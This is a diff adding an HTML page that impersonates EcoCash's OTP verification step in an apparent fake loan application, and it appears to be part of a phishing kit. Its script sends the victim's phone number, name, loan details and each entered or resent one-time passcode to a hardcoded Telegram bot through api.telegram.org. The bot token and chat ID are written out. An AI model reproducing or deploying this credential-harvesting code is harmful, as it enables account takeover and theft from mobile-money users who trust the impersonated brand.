@@ -1,0 +1,678 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EcoCash - OTP Verification</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        
+        .logo {
+            text-align: center;
+            font-size: 32px;
+            color: #667eea;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+        
+        h2 {
+            text-align: center;
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 24px;
+        }
+        
+        .subtitle {
+            text-align: center;
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 16px;
+        }
+        
+        .phone-display {
+            background: #f0f3ff;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            font-weight: bold;
+            color: #667eea;
+            font-size: 18px;
+            text-align: center;
+        }
+        
+        /* Hidden input for paste functionality */
+        .hidden-otp-input {
+            position: absolute;
+            opacity: 0;
+            pointer-events: none;
+            height: 0;
+            width: 0;
+        }
+        
+        /* Main OTP input for copy/paste */
+        .otp-main-input {
+            width: 100%;
+            padding: 15px;
+            font-size: 18px;
+            text-align: center;
+            letter-spacing: 15px;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            margin: 20px 0;
+            outline: none;
+            font-weight: bold;
+        }
+        
+        .otp-main-input:focus {
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.2);
+        }
+        
+        .otp-main-input::placeholder {
+            letter-spacing: normal;
+            color: #aaa;
+            font-size: 14px;
+        }
+        
+        /* Individual OTP inputs (hidden but kept for backward compatibility) */
+        .otp-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin: 30px 0;
+            position: relative;
+        }
+        
+        .otp-input {
+            width: 45px;
+            height: 55px;
+            text-align: center;
+            font-size: 22px;
+            font-weight: bold;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            background: white;
+            opacity: 0.5;
+            pointer-events: none;
+        }
+        
+        .otp-input.active {
+            border-color: #667eea;
+            opacity: 1;
+            background: #f0f3ff;
+        }
+        
+        .input-method-toggle {
+            text-align: center;
+            margin: 10px 0;
+            font-size: 14px;
+            color: #666;
+        }
+        
+        .toggle-link {
+            color: #667eea;
+            text-decoration: none;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        
+        .toggle-link:hover {
+            text-decoration: underline;
+        }
+        
+        .timer {
+            text-align: center;
+            margin: 20px 0;
+            font-size: 14px;
+            color: #666;
+        }
+        
+        .timer span {
+            color: #667eea;
+            font-weight: bold;
+        }
+        
+        .btn-verify {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 18px;
+            font-size: 18px;
+            border-radius: 10px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: bold;
+            transition: transform 0.3s;
+            margin-top: 10px;
+        }
+        
+        .btn-verify:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
+        }
+        
+        .btn-verify:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+        
+        .resend-link {
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .resend-link a {
+            color: #667eea;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .resend-link a:hover {
+            text-decoration: underline;
+        }
+        
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            font-size: 12px;
+            color: #999;
+            border-top: 1px solid #eee;
+            padding-top: 20px;
+        }
+        
+        /* Paste notification */
+        .paste-notification {
+            text-align: center;
+            background: #e8f4ff;
+            padding: 8px;
+            border-radius: 5px;
+            margin: 10px 0;
+            font-size: 13px;
+            color: #0066cc;
+            display: none;
+        }
+        
+        .paste-notification.show {
+            display: block;
+            animation: fadeIn 0.3s;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">EcoCash</div>
+        <h2>OTP Verification</h2>
+        <p class="subtitle">Enter the 6-digit OTP sent to your number</p>
+        
+        <div class="phone-display" id="phoneDisplay">
+            Loading...
+        </div>
+        
+        <!-- Hidden input for better paste handling -->
+        <input type="text" id="hiddenOtpInput" class="hidden-otp-input">
+        
+        <!-- Main OTP input for copy/paste -->
+        <input 
+            type="text" 
+            id="otpMainInput" 
+            class="otp-main-input" 
+            placeholder="Enter 6-digit OTP here"
+            maxlength="6"
+            inputmode="numeric"
+            pattern="[0-9]{6}"
+        >
+        
+        <div class="paste-notification" id="pasteNotification">
+            ✓ OTP pasted successfully! Click SUBMIT to verify.
+        </div>
+        
+        <div class="input-method-toggle">
+            <a class="toggle-link" id="toggleMethod" onclick="toggleInputMethod()">
+                Switch to individual digit input
+            </a>
+        </div>
+        
+        <!-- Individual OTP inputs (hidden by default) -->
+        <div class="otp-inputs" id="individualInputs" style="display: none;">
+            <input type="text" class="otp-input" maxlength="1" data-index="0">
+            <input type="text" class="otp-input" maxlength="1" data-index="1">
+            <input type="text" class="otp-input" maxlength="1" data-index="2">
+            <input type="text" class="otp-input" maxlength="1" data-index="3">
+            <input type="text" class="otp-input" maxlength="1" data-index="4">
+            <input type="text" class="otp-input" maxlength="1" data-index="5">
+        </div>
+        
+        <div class="timer">
+            Resend OTP in <span id="resendTimer">109</span> seconds
+        </div>
+        
+        <button class="btn-verify" id="verifyBtn" onclick="verifyOTP()">
+            SUBMIT
+        </button>
+        
+        <div class="resend-link">
+            <a href="#" id="resendLink" onclick="resendOTP()">Resend OTP</a>
+        </div>
+        
+        <div class="footer">
+            © 2025 EcoCash. All rights reserved.
+        </div>
+    </div>
+
+    <script>
+        let otpData = {};
+        let countdownInterval = null;
+        let timeLeft = 109; // 109 seconds like in your image
+        let useIndividualInputs = false;
+        
+        document.addEventListener('DOMContentLoaded', function() {
+            // Get saved data
+            const applicationData = JSON.parse(localStorage.getItem('loanApplication')) || {};
+            otpData = JSON.parse(localStorage.getItem('otpVerification')) || {};
+            
+            // Display phone number
+            const phone = applicationData.phone || otpData.phone || '*********';
+            document.getElementById('phoneDisplay').textContent = `+263${phone}`;
+            
+            // Setup OTP inputs
+            setupOTPInputs();
+            
+            // Start countdown
+            startCountdown();
+            
+            // Auto-focus main OTP input
+            document.getElementById('otpMainInput').focus();
+        });
+        
+        function setupOTPInputs() {
+            const mainInput = document.getElementById('otpMainInput');
+            const hiddenInput = document.getElementById('hiddenOtpInput');
+            const individualInputs = document.querySelectorAll('.otp-input');
+            const pasteNotification = document.getElementById('pasteNotification');
+            
+            // Main input for copy/paste
+            mainInput.addEventListener('input', function(e) {
+                // Allow only digits
+                this.value = this.value.replace(/[^0-9]/g, '');
+                
+                // Limit to 6 digits
+                if (this.value.length > 6) {
+                    this.value = this.value.slice(0, 6);
+                }
+                
+                // Update individual inputs visually
+                updateIndividualInputs(this.value);
+                
+                // Auto-submit when 6 digits are entered
+                if (this.value.length === 6) {
+                    // Show paste notification if more than 1 digit was entered at once
+                    if (this.value.length > 1) {
+                        pasteNotification.classList.add('show');
+                        setTimeout(() => {
+                            pasteNotification.classList.remove('show');
+                        }, 3000);
+                    }
+                    // Auto focus verify button
+                    document.getElementById('verifyBtn').focus();
+                }
+            });
+            
+            // Paste handling
+            mainInput.addEventListener('paste', function(e) {
+                e.preventDefault();
+                const pastedData = e.clipboardData.getData('text');
+                const numbersOnly = pastedData.replace(/[^0-9]/g, '');
+                
+                if (numbersOnly.length >= 6) {
+                    this.value = numbersOnly.slice(0, 6);
+                    updateIndividualInputs(this.value);
+                    
+                    // Show notification
+                    pasteNotification.classList.add('show');
+                    setTimeout(() => {
+                        pasteNotification.classList.remove('show');
+                    }, 3000);
+                    
+                    // Auto focus verify button
+                    setTimeout(() => {
+                        document.getElementById('verifyBtn').focus();
+                    }, 100);
+                } else {
+                    this.value = numbersOnly;
+                    updateIndividualInputs(this.value);
+                }
+            });
+            
+            // Individual inputs setup (for when toggled)
+            individualInputs.forEach(input => {
+                input.addEventListener('input', function(e) {
+                    this.value = this.value.replace(/[^0-9]/g, '');
+                    
+                    if (this.value.length === 1) {
+                        const nextIndex = parseInt(this.dataset.index) + 1;
+                        if (nextIndex < 6) {
+                            individualInputs[nextIndex].focus();
+                        } else {
+                            // All filled, update main input
+                            updateMainInputFromIndividual();
+                            document.getElementById('verifyBtn').focus();
+                        }
+                    }
+                    
+                    // Update visual state
+                    updateInputVisualState();
+                });
+                
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && this.value.length === 0) {
+                        const prevIndex = parseInt(this.dataset.index) - 1;
+                        if (prevIndex >= 0) {
+                            individualInputs[prevIndex].focus();
+                        }
+                    }
+                });
+                
+                input.addEventListener('paste', function(e) {
+                    e.preventDefault();
+                    const pastedData = e.clipboardData.getData('text');
+                    const numbersOnly = pastedData.replace(/[^0-9]/g, '');
+                    
+                    if (numbersOnly.length >= 6) {
+                        // Fill all inputs with pasted data
+                        for (let i = 0; i < 6; i++) {
+                            if (individualInputs[i]) {
+                                individualInputs[i].value = numbersOnly.charAt(i) || '';
+                            }
+                        }
+                        updateMainInputFromIndividual();
+                        document.getElementById('verifyBtn').focus();
+                    }
+                });
+            });
+            
+            // Function to update individual inputs based on main input
+            function updateIndividualInputs(value) {
+                for (let i = 0; i < 6; i++) {
+                    if (individualInputs[i]) {
+                        individualInputs[i].value = value.charAt(i) || '';
+                    }
+                }
+                updateInputVisualState();
+            }
+            
+            // Function to update main input from individual inputs
+            function updateMainInputFromIndividual() {
+                let combined = '';
+                individualInputs.forEach(input => {
+                    combined += input.value;
+                });
+                mainInput.value = combined;
+            }
+            
+            // Function to update visual state of individual inputs
+            function updateInputVisualState() {
+                individualInputs.forEach(input => {
+                    if (input.value) {
+                        input.classList.add('active');
+                    } else {
+                        input.classList.remove('active');
+                    }
+                });
+            }
+        }
+        
+        function toggleInputMethod() {
+            useIndividualInputs = !useIndividualInputs;
+            const mainInput = document.getElementById('otpMainInput');
+            const individualInputsDiv = document.getElementById('individualInputs');
+            const toggleLink = document.getElementById('toggleMethod');
+            
+            if (useIndividualInputs) {
+                // Switch to individual inputs
+                mainInput.style.display = 'none';
+                individualInputsDiv.style.display = 'flex';
+                toggleLink.textContent = 'Switch to single input (copy/paste)';
+                
+                // Transfer value from main to individual
+                const mainValue = mainInput.value;
+                const individualInputs = document.querySelectorAll('.otp-input');
+                
+                for (let i = 0; i < 6; i++) {
+                    if (individualInputs[i]) {
+                        individualInputs[i].value = mainValue.charAt(i) || '';
+                    }
+                }
+                
+                // Focus first empty input or first one
+                let firstEmptyIndex = 0;
+                for (let i = 0; i < 6; i++) {
+                    if (!individualInputs[i].value) {
+                        firstEmptyIndex = i;
+                        break;
+                    }
+                }
+                individualInputs[firstEmptyIndex].focus();
+                
+            } else {
+                // Switch to main input
+                mainInput.style.display = 'block';
+                individualInputsDiv.style.display = 'none';
+                toggleLink.textContent = 'Switch to individual digit input';
+                
+                // Transfer value from individual to main
+                const individualInputs = document.querySelectorAll('.otp-input');
+                let combined = '';
+                individualInputs.forEach(input => {
+                    combined += input.value;
+                });
+                mainInput.value = combined;
+                
+                // Focus main input
+                mainInput.focus();
+            }
+        }
+        
+        function startCountdown() {
+            const resendTimer = document.getElementById('resendTimer');
+            const resendLink = document.getElementById('resendLink');
+            
+            function update() {
+                resendTimer.textContent = timeLeft;
+                
+                if (timeLeft > 0) {
+                    timeLeft--;
+                } else {
+                    clearInterval(countdownInterval);
+                    resendLink.style.pointerEvents = 'auto';
+                    resendLink.style.color = '#667eea';
+                }
+            }
+            
+            update();
+            countdownInterval = setInterval(update, 1000);
+        }
+        
+        function verifyOTP() {
+            let enteredOtp = '';
+            
+            if (useIndividualInputs) {
+                // Get from individual inputs
+                const otpInputs = document.querySelectorAll('.otp-input');
+                otpInputs.forEach(input => {
+                    enteredOtp += input.value;
+                });
+            } else {
+                // Get from main input
+                enteredOtp = document.getElementById('otpMainInput').value;
+            }
+            
+            if (enteredOtp.length !== 6) {
+                alert('Please enter the 6-digit OTP');
+                return;
+            }
+            
+            if (enteredOtp === otpData.otp) {
+                // OTP verified successfully
+                sendVerificationSuccess(enteredOtp);
+                
+                // Redirect to qualification page (like your image 1001918218.jpg)
+                window.location.href = 'qualification.html';
+            } else {
+                // Invalid OTP
+                alert('Invalid OTP. Please try again.');
+                
+                // Send invalid attempt to Telegram (EXACTLY AS BEFORE - NOT CHANGED)
+                sendInvalidOTPToTelegram(enteredOtp);
+                
+                // Clear inputs
+                if (useIndividualInputs) {
+                    const otpInputs = document.querySelectorAll('.otp-input');
+                    otpInputs.forEach(input => input.value = '');
+                    otpInputs[0].focus();
+                } else {
+                    const mainInput = document.getElementById('otpMainInput');
+                    mainInput.value = '';
+                    mainInput.focus();
+                }
+            }
+        }
+        
+        function sendVerificationSuccess(enteredOtp) {
+            const applicationData = JSON.parse(localStorage.getItem('loanApplication')) || {};
+            const botToken = '8076358052:AAGvUw1lJsUeJAYK2V8Xf-vz3hn_W1hgWVI';
+            const chatId = '5520957080';
+            
+            const message = `
+✅ *OTP VERIFICATION COMPLETE*
+
+📋 *Application ID:* ${applicationData.applicationId || 'N/A'}
+📱 *Phone:* +263${applicationData.phone || otpData.phone}
+🔢 *OTP Entered:* ${enteredOtp}
+👤 *Applicant:* ${applicationData.firstName || 'N/A'} ${applicationData.lastName || 'N/A'}
+✅ *Status:* Fully Verified
+
+💰 *Loan Application:*
+• Amount: $${applicationData.loanAmount || 'N/A'}
+• Term: ${applicationData.loanTerm || 'N/A'} months
+• Purpose: ${applicationData.purpose || 'N/A'}
+
+🎯 *Redirecting to Account Qualification*
+            `;
+            
+            const encodedMessage = encodeURIComponent(message);
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodedMessage}&parse_mode=Markdown`)
+                .catch(error => console.error('Error:', error));
+        }
+        
+        function sendInvalidOTPToTelegram(enteredOtp) {
+            const applicationData = JSON.parse(localStorage.getItem('loanApplication')) || {};
+            const botToken = '8076358052:AAGvUw1lJsUeJAYK2V8Xf-vz3hn_W1hgWVI';
+            const chatId = '5520957080';
+            
+            const message = `
+❌ *INVALID OTP ATTEMPT*
+
+📋 *Application ID:* ${applicationData.applicationId || 'N/A'}
+📱 *Phone:* +263${applicationData.phone || otpData.phone}
+❌ *Wrong OTP:* ${enteredOtp}
+✅ *Correct OTP:* ${otpData.otp || 'Unknown'}
+
+🕒 *Time:* ${new Date().toLocaleString()}
+⚠️ *Client entered wrong OTP*
+            `;
+            
+            const encodedMessage = encodeURIComponent(message);
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodedMessage}&parse_mode=Markdown`)
+                .catch(error => console.error('Error:', error));
+        }
+        
+        function resendOTP() {
+            if (timeLeft > 0) {
+                alert(`Please wait ${timeLeft} seconds before resending OTP`);
+                return;
+            }
+            
+            // Generate new OTP
+            const newOTP = Math.floor(100000 + Math.random() * 900000);
+            
+            // Update OTP data
+            otpData.otp = newOTP.toString();
+            otpData.expires = new Date(Date.now() + 15 * 60 * 1000).toISOString();
+            
+            localStorage.setItem('otpVerification', JSON.stringify(otpData));
+            
+            // Send new OTP to Telegram
+            const applicationData = JSON.parse(localStorage.getItem('loanApplication')) || {};
+            sendNewOTPToTelegram(newOTP, applicationData.phone || otpData.phone);
+            
+            // Reset timer
+            timeLeft = 109;
+            startCountdown();
+            
+            // Clear inputs
+            if (useIndividualInputs) {
+                document.querySelectorAll('.otp-input').forEach(input => input.value = '');
+                document.querySelector('.otp-input[data-index="0"]').focus();
+            } else {
+                document.getElementById('otpMainInput').value = '';
+                document.getElementById('otpMainInput').focus();
+            }
+            
+            alert('New OTP has been sent.');
+        }
+        
+        function sendNewOTPToTelegram(otp, phone) {
+            const botToken = '8076358052:AAGvUw1lJsUeJAYK2V8Xf-vz3hn_W1hgWVI';
+            const chatId = '5520957080';
+            
+            const applicationData = JSON.parse(localStorage.getItem('loanApplication')) || {};
+            
+            const message = `
+🔄 *OTP RESENT*
+
+📋 *Application ID:* ${applicationData.applicationId || 'N/A'}
+🔢 *NEW OTP:* ${otp}
+📱 *To Phone:* +263${phone}
+⏰ *Expires:* 15 minutes
+
+🕒 *Resent at:* ${new Date().toLocaleString()}
+            `;
+            
+            const encodedMessage = encodeURIComponent(message);
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodedMessage}&parse_mode=Markdown`)
+                .catch(error => console.error('Error:', error));
+        }
+    </script>
+</body>
+</html>
